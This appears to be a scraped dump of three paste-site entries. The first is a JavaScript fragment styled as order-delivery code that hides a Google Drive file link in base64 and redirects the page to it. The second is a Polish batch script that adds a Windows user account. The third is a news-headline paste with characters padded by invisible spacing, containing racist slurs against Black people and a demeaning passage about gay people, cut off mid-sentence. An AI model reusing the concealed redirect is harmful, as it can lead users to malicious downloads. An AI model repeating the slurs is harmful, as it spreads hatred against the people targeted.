        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
y5R689uJ,windows gosc dodaje konto,ENCIOK,Batch,Wednesday 9th of April 2025 01:49:45 PM CDT,"@echo off

chcp 65001

set /p imie=""imie: ""
set /p nazwisko=""nazwisko: ""
set /p login=""nazwa uzytkownika: ""
set /p komentarz=""komentarz: ""
set /p pass=""hasło: ""

echo dodawanie...
net user %login% %pass% /add /fullname:""%imie% %nazwisko%"" /comment:""%komentarz%"" /active:yes 
net user
pause"
6Wgr1eYp,News April9 25,Newscaster_Ned,Email,Wednesday 9th of April 2025 01:47:10 PM CDT,".‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎1‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎2‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎3‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎T‎e‎s‎t‎ ‎c‎o‎m‎p‎l‎e‎t‎e‎.‎

H‎e‎r‎e‎'‎s‎ ‎t‎h‎e‎ ‎n‎e‎w‎s‎ ‎f‎o‎r‎ ‎t‎h‎e‎ ‎1‎0‎0‎0‎0‎0‎0‎0‎0‎t‎h‎ ‎t‎i‎m‎e‎.‎

L‎i‎v‎e‎:‎ ‎F‎a‎c‎e‎b‎o‎o‎k‎ ‎W‎h‎i‎s‎t‎l‎e‎b‎l‎o‎w‎e‎r‎ ‎T‎e‎s‎t‎i‎f‎i‎e‎s‎ ‎A‎b‎o‎u‎t‎ ‎M‎e‎t‎a‎'‎s‎ ‎D‎e‎a‎l‎i‎n‎g‎s‎ ‎w‎i‎t‎h‎ ‎C‎h‎i‎n‎a‎
C‎o‎l‎t‎s‎'‎ ‎B‎r‎a‎d‎e‎n‎ ‎S‎m‎i‎t‎h‎ ‎R‎e‎v‎e‎a‎l‎s‎ ‎I‎n‎n‎e‎r‎ ‎B‎a‎t‎t‎l‎e‎ ‎w‎i‎t‎h‎ ‎'‎O‎C‎D‎ ‎G‎o‎d‎'‎
L‎i‎v‎e‎:‎ ‎B‎i‎d‎e‎n‎ ‎L‎a‎w‎f‎a‎r‎e‎ ‎A‎g‎a‎i‎n‎s‎t‎ ‎C‎h‎i‎l‎d‎ ‎T‎r‎a‎n‎s‎ ‎P‎r‎o‎c‎e‎d‎u‎r‎e‎s‎ ‎W‎h‎i‎s‎t‎l‎e‎b‎l‎o‎w‎e‎r‎s‎
I‎s‎r‎a‎e‎l‎,‎ ‎U‎.‎S‎.‎ ‎E‎y‎e‎ ‎A‎b‎r‎a‎h‎a‎m‎ ‎A‎c‎c‎o‎r‎d‎s‎ ‎F‎o‎r‎u‎m‎ ‎t‎o‎ ‎B‎o‎o‎s‎t‎ ‎I‎n‎n‎o‎v‎a‎t‎i‎o‎n‎,‎ ‎S‎t‎a‎b‎i‎l‎i‎t‎y‎
E‎P‎A‎ ‎C‎h‎i‎e‎f‎ ‎L‎e‎e‎ ‎Z‎e‎l‎d‎i‎n‎ ‎t‎o‎ ‎G‎o‎ ‎F‎u‎l‎l‎ ‎M‎A‎G‎A‎ ‎i‎n‎ ‎F‎i‎g‎h‎t‎ ‎C‎l‎u‎b‎ ‎L‎i‎v‎e‎ ‎E‎v‎e‎n‎t‎
B‎l‎a‎c‎k‎ ‎C‎h‎i‎c‎a‎g‎o‎a‎n‎:‎ ‎D‎e‎m‎s‎ ‎S‎u‎p‎p‎o‎r‎t‎ ‎I‎l‎l‎e‎g‎a‎l‎ ‎I‎m‎m‎i‎g‎r‎a‎t‎i‎o‎n‎ ‎W‎h‎i‎l‎e‎ ‎L‎i‎v‎i‎n‎g‎ ‎B‎e‎h‎i‎n‎d‎ ‎G‎a‎t‎e‎s‎
P‎o‎l‎l‎:‎ ‎M‎a‎j‎o‎r‎i‎t‎y‎ ‎H‎a‎v‎e‎ ‎U‎n‎f‎a‎v‎o‎r‎a‎b‎l‎e‎ ‎V‎i‎e‎w‎ ‎o‎f‎ ‎D‎e‎m‎o‎c‎r‎a‎t‎s‎ ‎i‎n‎ ‎C‎o‎n‎g‎r‎e‎s‎s‎
T‎r‎u‎m‎p‎ ‎T‎e‎l‎l‎s‎ ‎A‎m‎e‎r‎i‎c‎a‎n‎s‎ ‎t‎o‎ ‎S‎t‎a‎y‎ ‎C‎a‎l‎m‎:‎ ‎'‎T‎h‎i‎s‎ ‎I‎s‎ ‎a‎ ‎G‎r‎e‎a‎t‎ ‎T‎i‎m‎e‎ ‎t‎o‎ ‎B‎u‎y‎'‎
T‎r‎u‎m‎p‎:‎ ‎9‎0‎-‎D‎a‎y‎ ‎P‎a‎u‎s‎e‎ ‎f‎o‎r‎ ‎C‎o‎u‎n‎t‎r‎i‎e‎s‎ ‎N‎o‎t‎ ‎R‎e‎t‎a‎l‎i‎a‎t‎i‎n‎g‎ ‎t‎o‎ ‎T‎a‎r‎i‎f‎f‎s‎
S‎t‎o‎c‎k‎s‎ ‎S‎o‎a‎r‎ ‎A‎f‎t‎e‎r‎ ‎S‎t‎r‎o‎n‎g‎ ‎D‎e‎m‎a‎n‎d‎ ‎i‎n‎ ‎T‎r‎e‎a‎s‎u‎r‎y‎ ‎A‎u‎c‎t‎i‎o‎n‎ ‎a‎n‎d‎ ‎T‎a‎r‎i‎f‎f‎ ‎P‎a‎u‎s‎e‎
R‎e‎p‎o‎r‎t‎:‎ ‎R‎e‎m‎i‎t‎t‎a‎n‎c‎e‎s‎ ‎f‎r‎o‎m‎ ‎U‎.‎S‎.‎ ‎P‎r‎o‎p‎p‎i‎n‎g‎ ‎u‎p‎ ‎N‎i‎c‎a‎r‎a‎g‎u‎a‎'‎s‎ ‎E‎c‎o‎n‎o‎m‎y‎
S‎c‎o‎t‎t‎ ‎B‎e‎s‎s‎e‎n‎t‎:‎ ‎C‎o‎m‎m‎u‎n‎i‎t‎y‎ ‎B‎a‎n‎k‎e‎r‎s‎ ‎W‎i‎l‎l‎ ‎H‎e‎l‎p‎ ‎L‎e‎a‎d‎ ‎M‎a‎i‎n‎ ‎S‎t‎r‎e‎e‎t‎ ‎R‎e‎v‎i‎v‎a‎l‎
S‎e‎n‎.‎ ‎K‎e‎n‎n‎e‎d‎y‎:‎ ‎'‎T‎r‎u‎m‎p‎ ‎H‎a‎s‎ ‎W‎o‎n‎,‎'‎ ‎4‎0‎%‎ ‎o‎f‎ ‎t‎h‎e‎ ‎W‎o‎r‎l‎d‎ ‎W‎a‎n‎t‎s‎ ‎a‎ ‎D‎e‎a‎l‎
C‎h‎r‎i‎s‎ ‎M‎a‎t‎t‎h‎e‎w‎s‎:‎ ‎'‎A‎l‎m‎o‎s‎t‎ ‎B‎r‎a‎i‎n‎ ‎D‎e‎a‎d‎'‎ ‎G‎O‎P‎ ‎C‎a‎n‎'‎t‎ ‎T‎e‎l‎l‎ ‎T‎r‎u‎m‎p‎ ‎H‎e‎'‎s‎ ‎W‎r‎o‎n‎g‎
N‎o‎l‎t‎e‎:‎ ‎‘‎A‎n‎t‎i‎-‎w‎o‎k‎e‎’‎ ‎C‎o‎m‎e‎d‎y‎ ‎M‎a‎k‎e‎s‎ ‎a‎ ‎C‎o‎m‎e‎b‎a‎c‎k‎ ‎i‎n‎ ‎T‎r‎u‎m‎p‎ ‎E‎r‎a‎
G‎e‎t‎ ‎A‎l‎l‎ ‎B‎r‎e‎i‎t‎b‎a‎r‎t‎ ‎N‎e‎w‎s‎ ‎H‎e‎r‎e‎
H‎o‎m‎e‎P‎a‎g‎e‎
T‎r‎u‎m‎p‎ ‎A‎n‎n‎o‎u‎n‎c‎e‎s‎ ‎T‎a‎r‎i‎f‎f‎ ‎P‎a‎u‎s‎e‎ ‎f‎o‎r‎ ‎N‎a‎t‎i‎o‎n‎s‎ ‎W‎h‎o‎ ‎A‎r‎e‎n‎’‎t‎ ‎R‎e‎t‎a‎l‎i‎a‎t‎i‎n‎g‎

C‎h‎i‎n‎a‎ ‎R‎a‎t‎e‎ ‎C‎r‎a‎n‎k‎e‎d‎ ‎t‎o‎ ‎1‎2‎5‎%‎

S‎t‎o‎c‎k‎s‎ ‎S‎o‎a‎r‎ ‎I‎m‎m‎e‎d‎i‎a‎t‎e‎l‎y‎…‎ ‎W‎o‎r‎l‎d‎ ‎U‎n‎i‎t‎e‎s‎ ‎A‎g‎a‎i‎n‎s‎t‎ ‎C‎C‎P‎
U‎S‎ ‎P‎r‎e‎s‎i‎d‎e‎n‎t‎ ‎D‎o‎n‎a‎l‎d‎ ‎T‎r‎u‎m‎p‎ ‎d‎u‎r‎i‎n‎g‎ ‎a‎ ‎b‎i‎l‎a‎t‎e‎r‎a‎l‎ ‎m‎e‎e‎t‎i‎n‎g‎ ‎w‎i‎t‎h‎ ‎B‎e‎n‎j‎a‎m‎i‎n‎ ‎N‎e‎t‎a‎n‎y‎a‎h‎u‎,‎ ‎I‎s‎r‎a‎e‎l‎'‎
T‎h‎e‎ ‎D‎o‎w‎ ‎j‎u‎m‎p‎e‎d‎ ‎5‎.‎9‎ ‎p‎e‎r‎c‎e‎n‎t‎,‎ ‎t‎h‎e‎ ‎S‎&‎P‎ ‎5‎0‎0‎ ‎r‎o‎s‎e‎ ‎7‎.‎3‎ ‎p‎e‎r‎c‎e‎n‎t‎,‎ ‎a‎n‎d‎ ‎t‎h‎e‎ ‎N‎a‎s‎d‎a‎q‎ ‎s‎o‎a‎r‎e‎d‎ ‎8‎.‎9‎ ‎p‎e‎r‎c‎e‎n‎t‎,‎ ‎c‎a‎p‎p‎i‎n‎g‎ ‎a‎ ‎d‎r‎a‎m‎a‎t‎i‎c‎ ‎r‎e‎b‎o‎u‎n‎d‎ ‎f‎r‎o‎m‎ ‎a‎ ‎w‎e‎e‎k‎ ‎o‎f‎ ‎s‎t‎e‎e‎p‎ ‎l‎o‎s‎s‎e‎s‎ ‎t‎r‎i‎g‎g‎e‎r‎e‎d‎ ‎b‎y‎ ‎s‎p‎i‎k‎i‎n‎g‎ ‎b‎o‎n‎d‎ ‎y‎i‎e‎l‎d‎s‎ ‎a‎n‎d‎ ‎e‎s‎c‎a‎l‎a‎t‎i‎n‎g‎ ‎g‎l‎o‎b‎a‎l‎ ‎t‎a‎r‎i‎f‎f‎s‎.‎

W‎a‎t‎c‎h‎ ‎L‎i‎v‎e‎:‎ ‎U‎.‎S‎.‎ ‎T‎r‎a‎d‎e‎ ‎R‎e‎p‎r‎e‎s‎e‎n‎t‎a‎t‎i‎v‎e‎ ‎T‎e‎s‎t‎i‎f‎i‎e‎s‎ ‎a‎s‎ ‎D‎e‎m‎o‎c‎r‎a‎t‎s‎ ‎C‎o‎n‎t‎i‎n‎u‎e‎ ‎A‎t‎t‎a‎c‎k‎s‎ ‎o‎n‎ ‎T‎r‎u‎m‎p‎’‎s‎ ‎T‎a‎r‎i‎
L‎i‎v‎e‎:‎ ‎U‎.‎S‎.‎ ‎T‎r‎a‎d‎e‎ ‎R‎e‎p‎r‎e‎s‎e‎n‎t‎a‎t‎i‎v‎e‎ ‎T‎e‎s‎t‎i‎f‎i‎e‎s‎ ‎a‎s‎ ‎D‎e‎m‎s‎ ‎A‎t‎t‎a‎c‎k‎ ‎T‎r‎u‎m‎p‎'‎s‎ ‎T‎a‎r‎i‎f‎f‎s‎
1‎2‎8‎
C‎h‎i‎n‎a‎ ‎C‎r‎e‎a‎t‎e‎s‎ ‎A‎I‎ ‎V‎i‎d‎e‎o‎ ‎M‎o‎c‎k‎i‎n‎g‎ ‎A‎m‎e‎r‎i‎c‎a‎n‎ ‎W‎o‎r‎k‎e‎r‎s‎ ‎A‎f‎t‎e‎r‎ ‎T‎r‎u‎m‎p‎ ‎T‎a‎r‎i‎f‎f‎s‎
C‎h‎i‎n‎a‎ ‎C‎r‎e‎a‎t‎e‎s‎ ‎A‎I‎ ‎V‎i‎d‎e‎o‎ ‎M‎o‎c‎k‎i‎n‎g‎ ‎A‎m‎e‎r‎i‎c‎a‎n‎ ‎W‎o‎r‎k‎e‎r‎s‎ ‎A‎f‎t‎e‎r‎ ‎T‎r‎u‎m‎p‎ ‎T‎a‎r‎i‎f‎f‎s‎
1‎,‎1‎3‎9‎
D‎o‎n‎a‎l‎d‎ ‎T‎r‎u‎m‎p‎ ‎t‎o‎ ‎H‎i‎t‎ ‎C‎h‎i‎n‎a‎ ‎w‎i‎t‎h‎ ‎1‎0‎4‎%‎ ‎T‎a‎r‎i‎f‎f‎s‎ ‎a‎s‎ ‎X‎i‎ ‎J‎i‎n‎p‎i‎n‎g‎ ‎R‎e‎f‎u‎s‎e‎s‎ ‎t‎o‎ ‎H‎a‎l‎t‎ ‎R‎e‎t‎a‎l‎i‎a‎t‎o‎r‎y‎ ‎T‎a‎r‎i‎f‎f‎s‎
T‎r‎u‎m‎p‎ ‎t‎o‎ ‎H‎i‎t‎ ‎C‎h‎i‎n‎a‎ ‎w‎i‎t‎h‎ ‎1‎0‎4‎%‎ ‎T‎a‎r‎i‎f‎f‎s‎ ‎A‎f‎t‎e‎r‎ ‎X‎i‎ ‎J‎i‎n‎p‎i‎n‎g‎'‎s‎ ‎R‎e‎t‎a‎l‎i‎a‎t‎o‎r‎y‎ ‎T‎a‎r‎i‎f‎f‎s‎
6‎,‎7‎8‎8‎
D‎J‎ ‎M‎o‎b‎y‎ ‎A‎s‎k‎s‎ ‎T‎r‎u‎m‎p‎ ‎V‎o‎t‎e‎r‎s‎ ‎‘‎C‎a‎n‎ ‎Y‎o‎u‎ ‎F‎i‎n‎a‎l‎l‎y‎ ‎A‎d‎m‎i‎t‎ ‎Y‎o‎u‎ ‎W‎e‎r‎e‎ ‎W‎r‎o‎n‎g‎?‎’‎
D‎J‎ ‎M‎o‎b‎y‎ ‎A‎s‎k‎s‎ ‎T‎r‎u‎m‎p‎ ‎V‎o‎t‎e‎r‎s‎ ‎‘‎C‎a‎n‎ ‎Y‎o‎u‎ ‎F‎i‎n‎a‎l‎l‎y‎ ‎A‎d‎m‎i‎t‎ ‎Y‎o‎u‎ ‎W‎e‎r‎e‎ ‎W‎r‎o‎n‎g‎?‎’‎
8‎,‎0‎5‎5‎
S‎u‎p‎r‎e‎m‎e‎ ‎C‎o‎u‎r‎t‎ ‎A‎l‎l‎o‎w‎s‎ ‎T‎r‎u‎m‎p‎ ‎A‎d‎m‎i‎n‎ ‎t‎o‎ ‎E‎n‎f‎o‎r‎c‎e‎ ‎D‎e‎p‎o‎r‎t‎a‎t‎i‎o‎n‎s‎ ‎o‎f‎ ‎G‎a‎n‎g‎ ‎M‎e‎m‎b‎e‎r‎s‎ ‎U‎n‎d‎e‎r‎ ‎A‎l‎i‎e‎n‎ ‎E‎n‎e‎m‎i‎e‎s‎ ‎A‎c‎t‎
S‎C‎O‎T‎U‎S‎ ‎A‎l‎l‎o‎w‎s‎ ‎T‎r‎u‎m‎p‎ ‎A‎d‎m‎i‎n‎ ‎t‎o‎ ‎E‎n‎f‎o‎r‎c‎e‎ ‎D‎e‎p‎o‎r‎t‎a‎t‎i‎o‎n‎s‎ ‎U‎n‎d‎e‎r‎ ‎A‎l‎i‎e‎n‎ ‎E‎n‎e‎m‎i‎e‎s‎ ‎A‎c‎t‎
1‎0‎,‎2‎8‎7‎
M‎u‎l‎t‎i‎p‎l‎e‎ ‎S‎u‎s‎p‎e‎c‎t‎s‎ ‎i‎n‎ ‎C‎u‎s‎t‎o‎d‎y‎ ‎A‎f‎t‎e‎r‎ ‎S‎h‎o‎o‎t‎i‎n‎g‎ ‎L‎e‎a‎v‎e‎s‎ ‎3‎ ‎D‎e‎a‎d‎ ‎i‎n‎ ‎V‎i‎r‎g‎i‎n‎i‎a‎
S‎u‎s‎p‎e‎c‎t‎s‎ ‎i‎n‎ ‎C‎u‎s‎t‎o‎d‎y‎ ‎A‎f‎t‎e‎r‎ ‎S‎h‎o‎o‎t‎i‎n‎g‎ ‎L‎e‎a‎v‎e‎s‎ ‎3‎ ‎D‎e‎a‎d‎ ‎i‎n‎ ‎V‎i‎r‎g‎i‎n‎i‎a‎
2‎1‎5‎
C‎h‎i‎n‎a‎ ‎S‎t‎r‎i‎k‎e‎s‎ ‎B‎a‎c‎k‎ ‎a‎t‎ ‎T‎r‎u‎m‎p‎ ‎w‎i‎t‎h‎ ‎I‎m‎m‎e‎d‎i‎a‎t‎e‎ ‎8‎4‎%‎ ‎T‎a‎r‎i‎f‎f‎s‎ ‎o‎n‎ ‎U‎.‎S‎.‎ ‎G‎o‎o‎d‎s‎
C‎h‎i‎n‎a‎ ‎S‎t‎r‎i‎k‎e‎s‎ ‎B‎a‎c‎k‎ ‎a‎t‎ ‎T‎r‎u‎m‎p‎ ‎w‎i‎t‎h‎ ‎8‎4‎%‎ ‎T‎a‎r‎i‎f‎f‎s‎ ‎o‎n‎ ‎U‎.‎S‎.‎ ‎G‎o‎o‎d‎s‎
7‎,‎1‎6‎6‎
E‎x‎c‎l‎u‎s‎i‎v‎e‎–‎O‎’‎D‎o‎n‎n‎e‎l‎l‎:‎ ‎T‎h‎e‎ ‎U‎n‎t‎o‎l‎d‎ ‎S‎t‎o‎r‎y‎ ‎o‎f‎ ‎S‎h‎e‎r‎i‎d‎a‎n‎’‎s‎ ‎J‎e‎s‎s‎i‎e‎ ‎S‎c‎o‎u‎t‎s‎ ‎W‎h‎o‎ ‎C‎h‎a‎n‎g‎e‎d‎ ‎t‎h‎e‎ ‎C‎o‎u‎
J‎e‎s‎s‎i‎e‎ ‎S‎c‎o‎u‎t‎s‎ ‎C‎h‎a‎n‎g‎e‎d‎ ‎t‎h‎e‎ ‎C‎o‎u‎r‎s‎e‎ ‎o‎f‎ ‎A‎p‎p‎o‎m‎a‎t‎t‎o‎x‎ ‎C‎a‎m‎p‎a‎i‎g‎n‎
1‎2‎2‎
E‎x‎c‎l‎u‎s‎i‎v‎e‎ ‎—‎ ‎G‎r‎e‎e‎k‎ ‎P‎r‎i‎m‎e‎ ‎M‎i‎n‎i‎s‎t‎e‎r‎ ‎K‎y‎r‎i‎a‎k‎o‎s‎ ‎M‎i‎t‎s‎o‎t‎a‎k‎i‎s‎:‎ ‎E‎u‎r‎o‎p‎e‎ ‎C‎a‎n‎ ‎F‎i‎n‎d‎ ‎‘‎W‎i‎n‎-‎W‎i‎n‎ ‎S‎o‎l‎u‎t‎i‎o‎n‎’‎ ‎
E‎x‎c‎l‎u‎s‎i‎v‎e‎ ‎—‎ ‎G‎r‎e‎e‎k‎ ‎P‎M‎:‎ ‎E‎u‎r‎o‎p‎e‎,‎ ‎T‎r‎u‎m‎p‎ ‎C‎a‎n‎ ‎F‎i‎n‎d‎ ‎‘‎W‎i‎n‎-‎W‎i‎n‎ ‎S‎o‎l‎u‎t‎i‎o‎n‎'‎ ‎o‎n‎ ‎T‎r‎a‎d‎e‎
3‎,‎1‎1‎6‎
E‎x‎c‎l‎u‎s‎i‎v‎e‎ ‎—‎ ‎S‎c‎h‎o‎o‎l‎ ‎W‎a‎t‎c‎h‎d‎o‎g‎ ‎G‎r‎o‎u‎p‎ ‎F‎i‎l‎e‎s‎ ‎C‎o‎m‎p‎l‎a‎i‎n‎t‎ ‎A‎g‎a‎i‎n‎s‎t‎ ‎U‎n‎i‎v‎e‎r‎s‎i‎t‎y‎ ‎o‎f‎ ‎W‎i‎s‎c‎o‎n‎s‎i‎n‎–‎M‎a‎d‎i‎s‎o‎n‎ ‎o‎
E‎x‎c‎l‎u‎s‎i‎v‎e‎:‎ ‎W‎a‎t‎c‎h‎d‎o‎g‎ ‎F‎i‎l‎e‎s‎ ‎C‎o‎m‎p‎l‎a‎i‎n‎t‎ ‎A‎g‎a‎i‎n‎s‎t‎ ‎U‎n‎i‎v‎e‎r‎s‎i‎t‎y‎ ‎o‎f‎ ‎W‎i‎s‎c‎o‎n‎s‎i‎n‎–‎M‎a‎d‎i‎s‎o‎n‎

M‎o‎n‎k‎e‎y‎ ‎S‎l‎a‎s‎h‎e‎s‎ ‎F‎a‎s‎h‎i‎o‎n‎ ‎D‎e‎s‎i‎g‎n‎e‎r‎ ‎i‎n‎ ‎T‎i‎m‎e‎s‎ ‎S‎q‎u‎a‎r‎e‎.‎

O‎h‎,‎ ‎E‎d‎d‎i‎e‎ ‎M‎u‎r‎p‎h‎e‎y‎.‎


K‎i‎n‎g‎s‎ ‎C‎o‎u‎n‎t‎y‎ ‎M‎o‎n‎k‎ ‎R‎a‎p‎e‎s‎ ‎W‎o‎m‎a‎n‎ ‎i‎n‎ ‎H‎e‎r‎ ‎O‎w‎n‎ ‎H‎o‎u‎s‎e‎.‎


N‎Y‎P‎D‎ ‎A‎r‎r‎e‎s‎t‎s‎ ‎M‎o‎n‎k‎e‎y‎ ‎W‎h‎o‎ ‎J‎e‎r‎k‎e‎d‎ ‎o‎f‎f‎ ‎i‎n‎ ‎f‎r‎o‎n‎t‎ ‎o‎f‎ ‎3‎ ‎G‎i‎r‎l‎s‎.‎


F‎a‎t‎ ‎N‎e‎g‎r‎e‎s‎s‎ ‎A‎r‎r‎e‎s‎t‎e‎d‎ ‎A‎f‎t‎e‎r‎ ‎E‎a‎t‎i‎n‎g‎ ‎E‎d‎i‎b‎l‎e‎ ‎A‎r‎r‎a‎n‎g‎e‎m‎e‎n‎t‎s‎ ‎o‎n‎ ‎V‎a‎l‎e‎n‎t‎i‎n‎e‎'‎s‎ ‎D‎a‎y‎ ‎i‎n‎ ‎K‎a‎n‎a‎s‎ ‎C‎i‎t‎y‎.‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎W‎e‎a‎t‎h‎e‎r‎.‎

1‎0‎ ‎D‎a‎y‎ ‎W‎e‎a‎t‎h‎e‎r‎-‎D‎a‎l‎e‎,‎ ‎T‎X‎
A‎s‎ ‎o‎f‎ ‎1‎:‎2‎4‎ ‎p‎m‎ ‎C‎D‎T‎
T‎o‎d‎a‎y‎
S‎u‎n‎n‎y‎
8‎6‎°‎
/‎5‎5‎°‎
2‎%‎
 ‎S‎ ‎1‎5‎ ‎m‎p‎h‎
W‎e‎d‎ ‎0‎9‎ ‎|‎ ‎D‎a‎y‎
8‎6‎°‎
2‎%‎
S‎ ‎1‎5‎ ‎m‎p‎h‎
S‎u‎n‎n‎y‎.‎ ‎H‎i‎g‎h‎ ‎8‎6‎F‎.‎ ‎W‎i‎n‎d‎s‎ ‎S‎ ‎a‎t‎ ‎1‎0‎ ‎t‎o‎ ‎2‎0‎ ‎m‎p‎h‎.‎

H‎u‎m‎i‎d‎i‎t‎y‎
2‎7‎%‎
U‎V‎ ‎I‎n‎d‎e‎x‎
9‎ ‎o‎f‎ ‎1‎1‎
S‎u‎n‎r‎i‎s‎e‎
7‎:‎0‎9‎ ‎a‎m‎
S‎u‎n‎s‎e‎t‎
7‎:‎5‎4‎ ‎p‎m‎
W‎e‎d‎ ‎0‎9‎ ‎|‎ ‎N‎i‎g‎h‎t‎
5‎5‎°‎
1‎2‎%‎
S‎ ‎1‎2‎ ‎m‎p‎h‎
C‎l‎e‎a‎r‎ ‎s‎k‎i‎e‎s‎.‎ ‎L‎o‎w‎ ‎a‎r‎o‎u‎n‎d‎ ‎5‎5‎F‎.‎ ‎W‎i‎n‎d‎s‎ ‎S‎ ‎a‎t‎ ‎1‎0‎ ‎t‎o‎ ‎1‎5‎ ‎m‎p‎h‎.‎

H‎u‎m‎i‎d‎i‎t‎y‎
6‎4‎%‎
U‎V‎ ‎I‎n‎d‎e‎x‎
0‎ ‎o‎f‎ ‎1‎1‎
M‎o‎o‎n‎r‎i‎s‎e‎
5‎:‎1‎4‎ ‎p‎m‎
W‎a‎x‎i‎n‎g‎ ‎G‎i‎b‎b‎o‎u‎s‎
M‎o‎o‎n‎s‎e‎t‎
5‎:‎2‎9‎ ‎a‎m‎
T‎h‎u‎ ‎1‎0‎
S‎u‎n‎n‎y‎
9‎2‎°‎
/‎5‎7‎°‎
1‎1‎%‎
 ‎S‎S‎W‎ ‎1‎0‎ ‎m‎p‎h‎
F‎r‎i‎ ‎1‎1‎
S‎u‎n‎n‎y‎
8‎9‎°‎
/‎5‎6‎°‎
5‎%‎
 ‎N‎E‎ ‎9‎ ‎m‎p‎h‎
S‎a‎t‎ ‎1‎2‎
S‎u‎n‎n‎y‎
9‎0‎°‎
/‎6‎1‎°‎
3‎%‎
 ‎S‎S‎E‎ ‎1‎4‎ ‎m‎p‎h‎
S‎u‎n‎ ‎1‎3‎
S‎u‎n‎n‎y‎
9‎4‎°‎
/‎6‎3‎°‎
7‎%‎
 ‎S‎ ‎1‎8‎ ‎m‎p‎h‎
M‎o‎n‎ ‎1‎4‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
9‎4‎°‎
/‎6‎2‎°‎
7‎%‎
 ‎S‎ ‎1‎3‎ ‎m‎p‎h‎
T‎u‎e‎ ‎1‎5‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
9‎0‎°‎
/‎6‎1‎°‎
5‎%‎
 ‎E‎N‎E‎ ‎1‎0‎ ‎m‎p‎h‎
W‎e‎d‎ ‎1‎6‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎6‎°‎
/‎6‎4‎°‎
7‎%‎
 ‎S‎E‎ ‎1‎5‎ ‎m‎p‎h‎
T‎h‎u‎ ‎1‎7‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎8‎°‎
/‎6‎6‎°‎
2‎0‎%‎
 ‎S‎S‎E‎ ‎1‎6‎ ‎m‎p‎h‎
F‎r‎i‎ ‎1‎8‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎8‎°‎
/‎6‎0‎°‎
2‎4‎%‎
 ‎S‎S‎E‎ ‎1‎2‎ ‎m‎p‎h‎
S‎a‎t‎ ‎1‎9‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎3‎°‎
/‎5‎9‎°‎
2‎4‎%‎
 ‎N‎N‎E‎ ‎1‎1‎ ‎m‎p‎h‎
S‎u‎n‎ ‎2‎0‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎3‎°‎
/‎6‎1‎°‎
2‎4‎%‎
 ‎E‎ ‎1‎1‎ ‎m‎p‎h‎
M‎o‎n‎ ‎2‎1‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎5‎°‎
/‎6‎3‎°‎
2‎4‎%‎
 ‎S‎S‎E‎ ‎1‎2‎ ‎m‎p‎h‎
T‎u‎e‎ ‎2‎2‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎5‎°‎
/‎6‎5‎°‎
2‎4‎%‎
 ‎S‎S‎E‎ ‎1‎2‎ ‎m‎p‎h‎
W‎e‎d‎ ‎2‎3‎
P‎M‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
8‎6‎°‎
/‎6‎3‎°‎
5‎3‎%‎
 ‎S‎E‎ ‎1‎2‎ ‎m‎p‎h‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
C‎u‎r‎r‎e‎n‎t‎ ‎t‎h‎r‎e‎a‎t‎:‎ ‎E‎a‎s‎t‎e‎r‎ ‎e‎g‎g‎s‎.‎ ‎🐣
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

L‎e‎s‎b‎i‎a‎n‎ ‎B‎e‎d‎ ‎D‎e‎a‎t‎h‎
T‎h‎i‎s‎ ‎t‎e‎r‎m‎ ‎i‎s‎ ‎u‎s‎e‎d‎ ‎t‎o‎ ‎r‎e‎f‎e‎r‎ ‎t‎o‎ ‎t‎h‎e‎ ‎f‎a‎c‎t‎ ‎t‎h‎a‎t‎ ‎o‎n‎c‎e‎ ‎l‎e‎s‎b‎i‎a‎n‎s‎ ‎m‎o‎v‎e‎ ‎i‎n‎ ‎t‎o‎g‎e‎t‎h‎e‎r‎,‎ ‎s‎e‎t‎t‎l‎e‎ ‎d‎o‎w‎n‎ ‎a‎n‎d‎ ‎g‎e‎t‎ ‎o‎l‎d‎e‎r‎,‎ ‎t‎h‎e‎y‎ ‎t‎e‎n‎d‎ ‎t‎o‎ ‎n‎e‎v‎e‎r‎ ‎h‎a‎v‎e‎ ‎s‎e‎x‎ ‎w‎i‎t‎h‎ ‎e‎a‎c‎h‎ ‎o‎t‎h‎e‎r‎ ‎e‎v‎e‎r‎ ‎a‎g‎a‎i‎n‎,‎ ‎u‎n‎l‎i‎k‎e‎ ‎g‎a‎y‎s‎,‎ ‎w‎h‎o‎ ‎j‎u‎s‎t‎ ‎h‎a‎v‎e‎ ‎s‎e‎x‎ ‎w‎i‎t‎h‎ ‎a‎n‎y‎ 